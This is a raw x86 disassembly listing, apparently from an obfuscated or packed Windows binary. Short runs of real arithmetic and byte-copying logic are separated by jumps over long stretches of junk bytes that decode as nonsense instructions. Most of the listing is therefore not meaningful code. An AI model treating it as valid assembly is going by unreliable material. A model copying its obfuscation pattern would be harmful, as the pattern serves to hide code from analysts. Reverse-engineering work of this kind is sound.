  40af85:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40af86:	cs inc ebx
  40af88:	sub    ebx,ecx
  40af8a:	dec    esi
  40af8b:	les    ebp,FWORD PTR [edx]
  40af8d:	fwait
  40af8e:	int3   
  40af8f:	sbb    eax,0xf0344011
  40af94:	lods   al,BYTE PTR ds:[esi]
  40af95:	rcl    DWORD PTR ds:0x59e54453,cl
  40af9b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40af9c:	inc    ecx
  40af9d:	outs   dx,BYTE PTR ds:[esi]
  40af9e:	jb     0xb20f8622
  40afa4:	xchg   esp,eax
  40afa5:	cmp    eax,0x5f826a6b
  40afaa:	ficom  WORD PTR [edx+0x72dad553]
  40afb0:	cmp    edi,eax
  40afb2:	ds xchg esp,eax
  40afb4:	xchg   DWORD PTR [esp+edx*8],esi
  40afb7:	mov    ecx,0xd910da4
  40afbc:	cmp    eax,0x4a813794
  40afc1:	out    0x4e,eax
  40afc3:	jo     0x40af7e
  40afc5:	and    ebx,ebp
  40afc7:	mov    ecx,edx
  40afc9:	or     edi,esi
  40afcb:	loope  0x40af50
  40afcd:	adc    eax,0x8adcc6a3
  40afd2:	loope  0x40b049
  40afd4:	cmp    cl,bl
  40afd6:	or     ebp,edx
  40afd8:	cwde   
  40afd9:	dec    ebx
  40afda:	lds    esp,FWORD PTR [ecx+0x54]
  40afdd:	fsub   st(4),st
  40afdf:	and    dl,dl
  40afe1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40afe2:	ins    BYTE PTR es:[edi],dx
  40afe3:	int    0x91
  40afe5:	mov    ebx,DWORD PTR [ebp-0x20]
  40afe8:	imul   edx,ebx
  40afeb:	mov    ebx,DWORD PTR [ebp-0x1c]
  40afee:	xor    edx,ebx
  40aff0:	sub    edx,0x26bd
  40aff6:	add    eax,ecx
  40aff8:	and    edx,0x7126
  40affe:	mov    ebx,ecx
  40b000:	sub    ebx,edx
  40b002:	mov    edx,DWORD PTR [ebp-0x18]
  40b005:	sub    eax,edx
  40b007:	mov    edx,DWORD PTR [ebp-0x14]
  40b00a:	sub    eax,edx
  40b00c:	mov    edx,DWORD PTR [ebp+0xc]
  40b00f:	mov    dl,BYTE PTR [ebx+edx*1+0x16c0]
  40b016:	mov    BYTE PTR [eax-0xbb5],dl
  40b01c:	mov    eax,DWORD PTR [ebp-0x10]
  40b01f:	xor    eax,0xffffe1ce
  40b024:	add    eax,DWORD PTR [ebp-0xc]
  40b027:	xor    edx,edx
  40b029:	and    eax,0x6d33
  40b02e:	lea    ecx,[ecx+eax*1-0x6520]
  40b035:	mov    eax,DWORD PTR [ebp+0x8]
  40b038:	mov    ebx,DWORD PTR [ebp-0x4]
  40b03b:	add    eax,edi
  40b03d:	div    ebx
  40b03f:	mov    edx,DWORD PTR [ebp-0x8]
  40b042:	mov    ebx,0x940a7
  40b047:	sub    eax,edx
  40b049:	xor    edx,edx
  40b04b:	div    ebx
  40b04d:	add    eax,esi
  40b04f:	cmp    ecx,eax
  40b051:	jb     0x40aa71
  40b057:	xor    ebx,ebx
  40b059:	inc    ebx
  40b05a:	mov    DWORD PTR [ebp+0xc],0x77bd
  40b061:	mov    DWORD PTR [ebp+0x8],0x4f2a
  40b068:	mov    DWORD PTR [ebp-0x8],0x4738
  40b06f:	mov    DWORD PTR [ebp-0xc],0x6c4e
  40b076:	mov    DWORD PTR [ebp-0x10],0x7f0d
  40b07d:	mov    DWORD PTR [ebp-0x14],0x64ec
  40b084:	mov    DWORD PTR [ebp-0x18],0x1984
  40b08b:	mov    DWORD PTR [ebp-0x1c],0x293
  40b092:	mov    eax,DWORD PTR [ebp+0x8]
  40b095:	mov    ecx,DWORD PTR [ebp+0xc]
  40b098:	add    eax,0x1ef2
  40b09d:	and    eax,ecx
  40b09f:	xor    eax,0x7240
  40b0a4:	mov    ecx,0x7aaa
  40b0a9:	sub    ecx,eax
  40b0ab:	mov    DWORD PTR [ebp+0xc],0x8d3
  40b0b2:	mov    DWORD PTR [ebp+0x8],0x2392
  40b0b9:	mov    DWORD PTR [ebp-0x20],ebx
  40b0bc:	mov    DWORD PTR [ebp-0x24],0x338f
  40b0c3:	mov    DWORD PTR [ebp-0x28],0x61c9
  40b0ca:	mov    eax,DWORD PTR [ebp+0x8]
  40b0cd:	mov    edx,DWORD PTR [ebp+0xc]
  40b0d0:	imul   eax,edx
  40b0d3:	xor    eax,0x40a0
  40b0d8:	or     eax,0x1a48
  40b0dd:	xor    eax,0x139ddb0
  40b0e2:	mov    esi,ecx
  40b0e4:	jmp    0x40b37b
  40b0e9:	stos   BYTE PTR es:[edi],al
  40b0ea:	(bad)  
  40b0eb:	mov    ss,WORD PTR [esi-0x355674c]
  40b0f1:	sub    BYTE PTR [edx],dh
  40b0f3:	inc    eax
  40b0f4:	fisttp QWORD PTR [eax-0x3d304d77]
  40b0fa:	scas   eax,DWORD PTR es:[edi]
  40b0fb:	mov    esi,0xbec2a9be
  40b100:	mov    esi,0xc19cc62d
  40b105:	push   ecx
  40b106:	jl     0x40b136
  40b108:	cmp    cl,ah
  40b10a:	xor    edi,DWORD PTR [ebx+0x6077661f]
  40b110:	push   esi
  40b111:	ins    BYTE PTR es:[edi],dx
  40b112:	adc    al,0x2d
  40b114:	ins    DWORD PTR es:[edi],dx
  40b115:	cmp    DWORD PTR [edx-0x30],edx
  40b118:	aam    0x9e
  40b11a:	jnp    0x40b0c7
  40b11c:	popf   
  40b11d:	icebp  
  40b11e:	lods   al,BYTE PTR ds:[esi]
  40b11f:	lahf   
  40b120:	data16 xchg si,ax
  40b123:	jl     0x40b15c
  40b125:	mov    dh,0x25
  40b127:	xlat   BYTE PTR ds:[ebx]
  40b128:	imul   DWORD PTR ds:0x5a3e9d25
  40b12e:	jle    0x40b0e4
  40b130:	sbb    BYTE PTR [edx],bh
  40b132:	mov    edi,0x9c20b7bf
  40b137:	dec    DWORD PTR [ebp+0x69d0afcb]
  40b13d:	cmp    al,0x5f
  40b13f:	pop    eax
  40b140:	das    
  40b141:	push   ebx
  40b142:	jnp    0x40b106
  40b144:	add    eax,0xb1ff2747
  40b149:	lea    ecx,[ecx+0x552161db]
  40b14f:	sub    eax,0xf97e3b7d
  40b154:	les    ebx,FWORD PTR [eax-0x5482c920]
  40b15a:	daa    
  40b15b:	mov    ecx,0x6cccc7d0
  40b160:	jnp    0x40b15c
  40b162:	pop    ebx
  40b163:	in     al,dx
  40b164:	call   ebx
  40b166:	xchg   DWORD PTR cs:[ebp+0x61],edx
  40b16a:	xor    eax,0x51068bb8
  40b16f:	int3   
  40b170:	mov    bl,0x58
  40b172:	and    DWORD PTR [ecx+ebp*2+0x71],edx
  40b176:	sub    eax,0x9d0c264b
  40b17b:	out    0xca,eax
  40b17d:	jne    0x40b13f
  40b17f:	mov    edx,0x313fd5a7
  40b184:	lods   al,BYTE PTR ds:[esi]
  40b185:	or     DWORD PTR [esi+0x58674e83],0x2eb374cf
  40b18f:	mov    DWORD PTR [esi],ebp
  40b191:	push   edx
  40b192:	adc    DWORD PTR [esi-0x7c],ebx
  40b195:	sub    DWORD PTR [edx+0x1e8d8dfd],ecx
  40b19b:	xor    esp,ecx
  40b19d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b19e:	push   ebp
  40b19f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b1a0:	pop    esi
  40b1a1:	jnp    0x40b205
  40b1a3:	cld    
  40b1a4:	jl     0x40b1f3
  40b1a6:	fiadd  WORD PTR [edi+edx*8+0x66]
  40b1aa:	pop    edi
  40b1ab:	push   edx
  40b1ac:	scas   al,BYTE PTR es:[edi]
  40b1ad:	test   eax,ebx
  40b1af:	pop    ds
  40b1b0:	test   BYTE PTR [ebp+0x59eefb4b],al
  40b1b6:	ja     0x40b234
  40b1b8:	in     eax,dx
  40b1b9:	out    dx,al
  40b1ba:	lahf   
  40b1bb:	retf   0x506d
  40b1be:	jb     0x40b197
  40b1c0:	and    dh,bh
  40b1c2:	mov    ebx,0x66faa70f
  40b1c7:	xor    esp,DWORD PTR [ebx]
  40b1c9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b1ca:	ret    
  40b1cb:	jae    0x40b1ba
  40b1cd:	(bad)  
  40b1ce:	pop    esi
  40b1cf:	dec    esp
  40b1d0:	sahf   
  40b1d1:	xor    BYTE PTR [edi+0x7c],0xe4
  40b1d5:	aad    0x7d
  40b1d7:	sbb    dh,bl
  40b1d9:	in     eax,dx
  40b1da:	rol    BYTE PTR [edx-0xf],0x17
  40b1de:	jns    0x40b1a0
  40b1e0:	jne    0x40b1e9
  40b1e2:	add    BYTE PTR [edi],cl
  40b1e4:	dec    ebx
  40b1e5:	xor    al,0x33
  40b1e7:	adc    DWORD PTR [ecx],esi
  40b1e9:	jbe    0x40b17a
  40b1eb:	iret   
  40b1ec:	mov    esp,0xc5215b29
  40b1f1:	and    eax,0xe3ffa143
  40b1f6:	loope  0x40b193
  40b1f8:	xor    ebx,DWORD PTR [ecx+0x18]
  40b1fb:	fmul   st(6),st
  40b1fd:	scas   eax,DWORD PTR es:[edi]
  40b1fe:	(bad)  [ebx-0x452af84]
  40b204:	pop    ecx
  40b205:	jmp    0x40b252
  40b207:	mov    ch,0xe4
  40b209:	cmp    al,0x49
  40b20b:	lds    edx,FWORD PTR [eax]
  40b20d:	repz or DWORD PTR [edi],esp
  40b210:	dec    ecx
  40b211:	inc    eax
  40b212:	loop   0x40b246
  40b214:	jo     0x40b1e3
  40b216:	repz retf 0x63af
  40b21a:	outs   dx,BYTE PTR ds:[esi]
  40b21b:	pop    ebp
  40b21c:	xchg   ecx,eax
  40b21d:	ss push ebx
  40b21f:	les    ecx,FWORD PTR [esi]
  40b221:	inc    ebx
  40b222:	addr16 mov ebx,0x54080c0f
  40b228:	xchg   ebx,eax
  40b229:	outs   dx,BYTE PTR ds:[esi]
  40b22a:	pop    ebx
  40b22b:	pushf  
  40b22c:	and    DWORD PTR [esi],esi
  40b22e:	aas    
  40b22f:	sbb    DWORD PTR [ebx],ebx
  40b231:	mov    ds:0xc97ccaaa,al
  40b236:	sar    BYTE PTR [eax+eax*4-0x3b],0x78
  40b23b:	xchg   esp,eax
  40b23c:	cmp    BYTE PTR ds:0x12650bd4,0xc5
  40b243:	pop    edx
  40b244:	lock imul DWORD PTR cs:[eax]
  40b248:	push   ds
  40b249:	jo     0x40b1ec
  40b24b:	jnp    0x40b2a0
  40b24d:	aas    
  40b24e:	aas    
  40b24f:	mov    ds:0xaa0c72ee,al
  40b254:	aaa    
  40b255:	clc    
  40b256:	cmp    ah,BYTE PTR [ecx+0x2cd07571]
  40b25c:	dec    ebp
  40b25d:	sbb    ch,BYTE PTR [edx+0x78]
  40b260:	aaa    
  40b261:	pop    ebx
  40b262:	pusha  
  40b263:	sub    BYTE PTR [esp+ebx*1],bl
  40b266:	mov    ebp,0x860bed84
  40b26b:	jbe    0x40b25b
  40b26d:	sub    cl,BYTE PTR [edx+0x5d]
  40b270:	pop    edi
  40b271:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b272:	iret   
  40b273:	(bad)
  40b276:	scas   eax,DWORD PTR es:[edi]
  40b277:	or     eax,0x32380e8e
  40b27c:	or     ebx,esi
  40b27e:	jno    0x40b2e1
  40b280:	lock push 0xd379c21d
  40b286:	inc    edx
  40b287:	xor    bh,BYTE PTR [ebp-0x138060cc]
  40b28d:	and    al,0x11
  40b28f:	ret    
  40b290:	sti    
  40b291:	loop   0x40b2de
  40b293:	ret    0xf5f8
  40b296:	sbb    dl,0xa2
  40b299:	popf   
  40b29a:	mov    eax,ds:0x2af5e4a5
  40b29f:	push   edi
  40b2a0:	add    ch,BYTE PTR [eax-0x4ff7ed40]
  40b2a6:	jbe    0x40b2db
  40b2a8:	mov    edx,0xd1c2183d
  40b2ad:	push   edi
  40b2ae:	xchg   eax,edi
  40b2b0:	std    
  40b2b1:	imul   ebx,DWORD PTR [esi+0x50],0x3e58eee7
  40b2b8:	leave  
  40b2b9:	stos   DWORD PTR es:[edi],eax
  40b2ba:	gs sub eax,0x82770dce
  40b2c0:	and    ecx,DWORD PTR [ebx+0x25]
  40b2c3:	mov    edx,esi
  40b2c5:	dec    ebx
  40b2c6:	aam    0xa2
  40b2c8:	fiadd  DWORD PTR [ebx]
  40b2ca:	add    BYTE PTR [ebp+0x441bc6fb],bh
  40b2d0:	jle    0x40b2c3
  40b2d2:	out    0xe3,eax
  40b2d4:	clc    
  40b2d5:	xchg   ebp,eax
  40b2d6:	and    eax,0xb38fa89c
  40b2db:	pop    edx
  40b2dc:	dec    edx
  40b2dd:	or     bl,BYTE PTR [eax]
  40b2df:	je     0x40b316
  40b2e1:	stos   DWORD PTR es:[edi],eax
  40b2e2:	fbld   TBYTE PTR [ebp-0x12]
  40b2e5:	add    eax,0x1c3ad013
  40b2ea:	mov    ecx,0x6c4b0fa1
  40b2ef:	popf   
  40b2f0:	mov    eax,ds:0xdd71d94a
  40b2f5:	jg     0x40b340
  40b2f7:	inc    esp
  40b2f8:	es out dx,al
  40b2fa:	(bad)  
  40b2fb:	mov    ds:0xd8268d52,al
  40b300:	mov    dl,0x19
  40b302:	push   eax
  40b303:	xchg   edi,eax
  40b304:	sbb    BYTE PTR [edi+ebx*2],ch
  40b307:	imul   eax,DWORD PTR fs:[ebp+0x1619fc38],0x32daa189
  40b312:	pop    ebx
  40b313:	mov    dh,0x45
  40b315:	test   DWORD PTR [ebx+0x14eecf2e],edi
  40b31b:	jge    0x40b307
  40b31d:	stc    
  40b31e:	fstp   DWORD PTR [esp+esi*4-0x1e93e308]
  40b325:	cmp    bh,BYTE PTR [ecx]
  40b327:	xchg   edi,eax
  40b328:	mov    eax,0x79c112e6
  40b32d:	mov    ecx,0xb1df3619
  40b332:	in     eax,dx
  40b333:	push   esi
  40b334:	mov    ch,0xfe
  40b336:	int    0x51
  40b338:	jp     0x40b2cc
  40b33a:	jnp    0x40b366
  40b33c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b33d:	sub    eax,0x94f734f7
  40b342:	and    al,0xea
  40b344:	repz fst QWORD PTR [ebx+0x6d]
  40b348:	inc    edi
  40b349:	add    DWORD PTR [ebp+0x71],0x55
  40b34d:	call   0x1bb40278
  40b352:	je     0x40b33d
  40b354:	mov    ah,0xb
  40b356:	jno    0x40b31e
  40b358:	push   ebp
  40b359:	ficomp WORD PTR [ecx]
  40b35b:	nop
  40b35c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b35d:	sbb    esp,ebp
  40b35f:	into   
  40b360:	and    esp,edx
  40b362:	icebp  
  40b363:	mov    bl,0x1
  40b365:	aaa    
  40b366:	cmc    
  40b367:	(bad)  
  40b368:	(bad)  
  40b369:	movd   DWORD PTR [ebp+0x78],mm3
  40b36d:	push   ebp
  40b36e:	add    ecx,DWORD PTR [ecx-0x6a01072a]
  40b374:	shl    BYTE PTR [ebx-0x27edc15e],cl
  40b37a:	mov    esi,0x458bf02b
  40b37f:	fmul   DWORD PTR [ebx+0x7d8bdc55]
  40b385:	loopne 0x40b394
  40b387:	ret    0x1c
  40b38a:	add    BYTE PTR [ebx],ch
  40b38c:	ret    0xd233
  40b38f:	div    edi
  40b391:	mov    edx,DWORD PTR ds:0x4226a8
  40b397:	mov    edx,DWORD PTR [edx+0x1d4]
  40b39d:	sub    edx,eax
  40b39f:	mov    eax,DWORD PTR [ebp+0x10]
  40b3a2:	mov    al,BYTE PTR [esi+eax*1]
  40b3a5:	mov    BYTE PTR [edx+ecx*1-0x1c12],al
  40b3ac:	mov    eax,DWORD PTR [ebp-0x1c]
  40b3af:	mov    edx,DWORD PTR [ebp-0x18]
  40b3b2:	imul   eax,edx
  40b3b5:	mov    edx,DWORD PTR [ebp-0x14]
  40b3b8:	imul   eax,eax,0x262b
  40b3be:	or     eax,edx
  40b3c0:	jmp    0x40b657
  40b3c5:	dec    ecx
  40b3c6:	mov    bl,0x7d
  40b3c8:	push   esp
  40b3c9:	mov    bh,0x74
  40b3cb:	pushf  
  40b3cc:	mov    esp,0xe3db5995
  40b3d1:	xor    BYTE PTR [ecx-0x4c522ea4],ah
  40b3d7:	mov    esi,0xbec2a9be
  40b3dc:	mov    esi,0xd933674d
  40b3e1:	jb     0x89fcdd2
  40b3e7:	sbb    al,0x24
  40b3e9:	and    BYTE PTR [edi+0x45],dl
  40b3ec:	sub    BYTE PTR [edi],bl
  40b3ee:	inc    edx
  40b3ef:	lahf   
  40b3f0:	pop    ds
  40b3f1:	cmp    edi,edx
  40b3f3:	jae    0x40b38b
  40b3f5:	in     al,0xec
  40b3f7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b3f8:	hlt    
  40b3f9:	jg     0x40b40f
  40b3fb:	ja     0x40b441
  40b3fd:	out    0x33,al
  40b3ff:	cmp    BYTE PTR [ebx],al
  40b401:	(bad)  
  40b402:	pop    ecx
  40b403:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b404:	(bad)  
  40b405:	dec    ebp
  40b406:	and    DWORD PTR [edi+0x49],ecx
  40b409:	mov    ds:0x19136dc9,al
  40b40e:	std    
  40b40f:	loope  0x40b3ac
  40b411:	int    0x5e
  40b413:	or     al,0xaf
  40b415:	push   ebx
  40b416:	leave  
  40b417:	xchg   edi,eax
  40b418:	pop    es
  40b419:	fucomp st(5)
  40b41b:	out    dx,al
  40b41c:	icebp  
  40b41d:	sti    
  40b41e:	jl     0x40b3d4
  40b420:	push   ebp
  40b421:	pop    ss
  40b422:	xor    edx,edi
  40b424:	lds    esp,FWORD PTR [edi-0x37]
  40b427:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b428:	call   0xd1261561
  40b42d:	push   es
  40b42e:	repnz cmp BYTE PTR [ebx],bl
  40b431:	xor    eax,0x1c95adbc
  40b436:	lds    eax,FWORD PTR [ebp-0x521040af]
  40b43c:	add    bl,BYTE PTR [ebx]
  40b43e:	outs   dx,DWORD PTR ds:[esi]
  40b43f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b440:	ret    
  40b441:	inc    esi
  40b442:	imul   eax,DWORD PTR [edi-0x15],0xffffffb5
  40b446:	out    0x4e,eax
  40b448:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b449:	imul   edi,DWORD PTR [ebp-0x3b],0x192f6999
  40b450:	mov    ebx,0xa78aaf8f
  40b455:	mov    al,0xce
  40b457:	je     0x40b465
  40b459:	or     BYTE PTR ds:0x210796b0,cl
  40b45f:	mov    ch,0xe3
  40b461:	dec    esi
  40b462:	lods   al,BYTE PTR ds:[esi]
  40b463:	cmp    ebx,DWORD PTR [edi+0x6f1e4871]
  40b469:	xor    al,0x97
  40b46b:	pop    ecx
  40b46c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b46d:	scas   eax,DWORD PTR es:[edi]
  40b46e:	outs   dx,DWORD PTR ds:[esi]
  40b46f:	repz jl 0x40b443
  40b472:	frstor [edx]
  40b474:	mov    al,ds:0xfc208a52
  40b479:	sbb    al,0x3f
  40b47b:	mov    ebx,0xf44babde
  40b480:	dec    esi
  40b481:	inc    edx
  40b482:	xchg   ebp,eax
  40b483:	lods   al,BYTE PTR ds:[esi]
  40b484:	cmc    
  40b485:	push   eax
  40b486:	fdivr  QWORD PTR [ebp+0x19]
  40b489:	dec    ecx
  40b48a:	jnp    0x40b42c
  40b48c:	fisttp DWORD PTR [edi+esi*4-0x71c1127a]
  40b493:	and    edx,DWORD PTR [edi+0x16b23d9a]
  40b499:	or     eax,0x3ae5b985
  40b49e:	in     al,0x77
  40b4a0:	push   cs
  40b4a1:	jbe    0x40b499
  40b4a3:	adc    DWORD PTR [esi-0x63],0xffffffaa
  40b4a7:	xchg   DWORD PTR [esi-0x60],esp
  40b4aa:	jmp    0xd7a7:0x4356c596
  40b4b1:	adc    DWORD PTR [eax-0x18],0xffffffbf
  40b4b5:	xor    eax,0x57012811
  40b4ba:	mov    BYTE PTR [ecx+0xe6d4d3b],ch
  40b4c0:	outs   dx,BYTE PTR ds:[esi]
  40b4c1:	fs std 
  40b4c3:	arpl   WORD PTR [edx+0x597ccd4c],si
  40b4c9:	aad    0xe7
  40b4cb:	and    dl,ah
  40b4cd:	mov    edi,0x8d0f07ec
  40b4d2:	leave  
  40b4d3:	test   ah,bh
  40b4d5:	xchg   edx,eax
  40b4d6:	dec    edi
  40b4d7:	into   
  40b4d8:	mov    BYTE PTR [edi+0x4cd3caf7],al
  40b4de:	inc    ecx
  40b4df:	and    al,0x9c
  40b4e1:	daa    
  40b4e2:	dec    edx
  40b4e3:	jp     0x40b525
  40b4e5:	mov    ecx,0xa2be1f90
  40b4ea:	push   edi
  40b4eb:	dec    ebp
  40b4ec:	in     al,dx
  40b4ed:	(bad)  
  40b4ee:	dec    ecx
  40b4ef:	or     al,0x7c
  40b4f1:	iret   
  40b4f2:	mov    ebp,?
  40b4f4:	addr16 push 0xffffffd8
  40b4f7:	xchg   ecx,eax
  40b4f8:	fisttp WORD PTR [esp+eax*1+0x7d]
  40b4fc:	and    eax,0x579d6ff7
  40b501:	cli    
  40b502:	daa    
  40b503:	mov    bh,0x9b
  40b505:	push   cs
  40b506:	pushf  
  40b507:	and    DWORD PTR [esi],ebx
  40b509:	fst    QWORD PTR [ecx-0x64f83e5b]
  40b50f:	clc    
  40b510:	cmp    dh,BYTE PTR [ebx+0x12bde220]
  40b516:	jmp    0xda6b:0x61217c45
  40b51d:	mov    cl,0x2
  40b51f:	jae    0x40b4d6
  40b521:	mov    ebx,0x318c3dc9
  40b526:	jg     0x40b546
  40b528:	je     0x40b5a0
  40b52a:	mov    ds:0x3326faf4,eax
  40b530:	mov    eax,ds:0x907ab29b
  40b535:	jne    0x40b52c
  40b537:	(bad)  
  40b538:	push   esp
  40b539:	mov    eax,0x9f2abede
  40b53e:	mov    esi,0x6c429fbb
  40b543:	rcr    esi,1
  40b545:	repz or BYTE PTR [eax-0x469eed05],bl
  40b54c:	sbb    al,0x28
  40b54e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b54f:	out    dx,al
  40b550:	sti    
  40b551:	push   edi
  40b552:	cmp    eax,DWORD PTR [ebx+0x72]
  40b555:	jae    0x40b54d
  40b557:	daa    
  40b558:	xchg   ecx,eax
  40b559:	popf   
  40b55a:	setae  bh
  40b55d:	bound  ebx,QWORD PTR [edi]
  40b55f:	adc    al,0xa
  40b561:	mov    bh,0xb9
  40b563:	fdivr  DWORD PTR [esp+eax*4]
  40b566:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b567:	mov    dl,0x8
  40b569:	popf   
  40b56a:	xchg   ebp,eax
  40b56b:	fcmovnu st,st(0)
  40b56d:	daa    
  40b56e:	rol    edi,0xe3
  40b571:	xchg   edx,eax
  40b572:	xor    DWORD PTR [eax+eiz*4-0x6dcdbe38],esp
  40b579:	add    ah,BYTE PTR es:[edx-0x41]
  40b57d:	jle    0x40b5f9
  40b57f:	jg     0x40b514
  40b581:	aam    0x2f
  40b583:	xchg   ebx,eax
  40b584:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b585:	dec    edx
  40b586:	cmc    
  40b587:	(bad)  
  40b588:	div    BYTE PTR [eax]
  40b58a:	cwde   
  40b58b:	loop   0x40b51a
  40b58d:	cs jb  0x40b528
  40b590:	rsm    
  40b592:	jnp    0x40b551
  40b594:	enter  0x7bf3,0x59
  40b598:	jecxz  0x40b526
  40b59a:	adc    DWORD PTR [edx+0x72],eax
  40b59d:	(bad)  
  40b59e:	pop    ds
  40b59f:	or     cx,WORD PTR [eax-0x36]
  40b5a3:	xor    al,0xb8
  40b5a5:	push   esi
  40b5a6:	sahf   
  40b5a7:	leave  
  40b5a8:	add    BYTE PTR [esi],al
  40b5aa:	adc    eax,esi
  40b5ac:	das    
  40b5ad:	add    cl,BYTE PTR [edx+esi*8-0x6b021521]
  40b5b4:	ins    DWORD PTR es:[edi],dx
  40b5b5:	mov    dh,0x9e
  40b5b7:	rcr    DWORD PTR [edx],0x6c
  40b5ba:	lahf   
  40b5bb:	mov    bl,0x17
  40b5bd:	bound  eax,QWORD PTR [esi]
  40b5bf:	es or  ebp,edi
  40b5c2:	out    0x51,al
  40b5c4:	push   ebx
  40b5c5:	sub    eax,0xa1b0e856
  40b5ca:	aad    0x9b
  40b5cc:	fidiv  WORD PTR [edi-0x3b]
  40b5cf:	add    al,0x64
  40b5d1:	sbb    eax,0x49f53c4f
  40b5d6:	inc    ebp
  40b5d7:	dec    ebx
  40b5d8:	jnp    0x40b63d
  40b5da:	cmp    eax,0x5fe47ab9
  40b5df:	xor    bl,bl
  40b5e1:	xor    eax,0xb64b92e2
  40b5e6:	ja     0x40b580
  40b5e8:	pop    edx
  40b5e9:	jle    0x40b58b
  40b5eb:	mov    edi,0xf361394a
  40b5f0:	dec    ebp
  40b5f1:	inc    ecx
  40b5f2:	adc    BYTE PTR [eax-0x6e],bl
  40b5f5:	mov    edi,0xc00a7b4e
  40b5fa:	xlat   BYTE PTR ds:[ebx]
  40b5fb:	bt     DWORD PTR [esi+0x6a24e258],ecx
  40b602:	div    BYTE PTR ds:0x401ff085
  40b608:	mov    bh,0x5d
  40b60a:	fstp   TBYTE PTR fs:[ecx+0x5b]
  40b60e:	push   eax
  40b60f:	and    esi,DWORD PTR ds:0xcff34028
  40b615:	pop    ds
  40b616:	sti    
  40b617:	pop    ds
  40b618:	iret   
  40b619:	mov    ebp,0x54e65290
  40b61e:	dec    eax
  40b61f:	or     al,BYTE PTR [eax-0x4bf50ef1]
  40b625:	pop    ebx
  40b626:	xor    dh,BYTE PTR [ecx-0x4d7d2ad0]
  40b62c:	sub    eax,0xc6d1220d
  40b631:	pop    edi
  40b632:	jle    0x40b673
  40b634:	stos   BYTE PTR es:[edi],al
  40b635:	shl    DWORD PTR [eax+0x3420e02b],cl
  40b63b:	out    0xd5,eax
  40b63d:	ins    BYTE PTR es:[edi],dx
  40b63e:	frndint 
  40b640:	shl    edi,cl
  40b642:	or     cl,0x93
  40b645:	and    ch,BYTE PTR [ebx+ebx*2]
  40b648:	std    
  40b649:	sub    al,dl
  40b64b:	pop    ebx
  40b64c:	je     0x40b685
  40b64e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b64f:	push   ebx
  40b650:	cs sub al,0xc4
  40b653:	loope  0x40b5dc
  40b655:	mov    al,ds:0xf0558bcf
  40b65a:	or     eax,edx
  40b65c:	xor    eax,0x59f6
  40b661:	lea    ecx,[ecx+eax*1+0x350559e6]
  40b668:	mov    eax,DWORD PTR [ebp-0xc]
  40b66b:	and    eax,0xddc
  40b670:	add    eax,DWORD PTR [ebp-0x8]
  40b673:	xor    eax,0x46e3
  40b678:	add    eax,0x50eb
  40b67d:	cmp    ecx,eax
  40b67f:	jne    0x40b0ab
  40b685:	pop    edi
  40b686:	pop    esi
  40b687:	pop    ebx
  40b688:	leave  
  40b689:	ret    0xc
  40b68c:	push   ebp
  40b68d:	mov    ebp,esp
  40b68f:	sub    esp,0xec
  40b695:	push   ebx
  40b696:	push   esi
  40b697:	mov    DWORD PTR [ebp-0x8],0x548e
  40b69e:	jmp    0x40baa9
  40b6a3:	or     DWORD PTR [edx],ebx
  40b6a5:	or     eax,DWORD PTR [edi]
  40b6a7:	sbb    al,0x18
  40b6a9:	or     DWORD PTR [eax+ebp*4],ebx
  40b6ac:	mov    ds:0x21e79e60,eax
  40b6b1:	inc    eax
  40b6b2:	fstp   QWORD PTR [edx-0x6d414149]
  40b6b8:	les    edi,FWORD PTR [esi-0x3d985142]
  40b6be:	mov    bl,BYTE PTR [edx-0x45fdb097]
  40b6c4:	repz sbb BYTE PTR [esi+0x6f],ch
  40b6c8:	add    BYTE PTR [eax+ecx*2],cl
  40b6cb:	adc    dl,dl
  40b6cd:	xor    bh,ch
  40b6cf:	fld    DWORD PTR [ebp-0x4791a464]
  40b6d5:	loope  0x40b68c
  40b6d7:	in     eax,dx
  40b6d8:	imul   edx,DWORD PTR ds:0xff9a98d3,0x18
  40b6df:	adc    DWORD PTR [esi],edx
  40b6e1:	outs   dx,DWORD PTR ds:[esi]
  40b6e2:	cmc    
  40b6e3:	mov    eax,0x171b3062
  40b6e8:	add    eax,0x5039abe1
  40b6ed:	xor    eax,0x362560e8
  40b6f2:	mov    bh,0x63
  40b6f4:	jle    0x40b74c
  40b6f6:	xchg   ecx,eax
  40b6f7:	xchg   ebp,eax
  40b6f8:	xchg   ecx,eax
  40b6f9:	fdivr  QWORD PTR [ecx]
  40b6fb:	in     al,dx
  40b6fc:	call   0x1943:0xaff440e3
  40b703:	cmc    
  40b704:	jb     0x40b68f
  40b706:	mov    dh,0xf1
  40b708:	push   esp
  40b709:	repnz lahf 
  40b70b:	leave  
  40b70c:	jl     0x40b704
  40b70e:	mov    cl,0xfb
  40b710:	int3   
  40b711:	cli    
  40b712:	and    edx,ecx
  40b714:	xchg   ecx,eax
  40b715:	adc    edi,DWORD PTR [eax+0x4d881ace]
  40b71b:	mov    edx,0x712a3849
  40b720:	aas    
  40b721:	out    dx,al
  40b722:	nop
  40b723:	loope  0x40b703
  40b725:	pop    es
  40b726:	sbb    edx,esi
  40b728:	mov    BYTE PTR [ebx+0x1c918f5a],dl
  40b72e:	je     0x40b730
  40b730:	pop    ds
  40b731:	clc    
  40b732:	shl    DWORD PTR ds:0xe95b953b,cl
  40b738:	fiadd  DWORD PTR [eax+0x61]
  40b73b:	or     dl,BYTE PTR [edi-0x336aee7d]
  40b741:	mov    DWORD PTR [ebx+0x2505f928],ebx
  40b747:	sub    eax,0x73d915d3
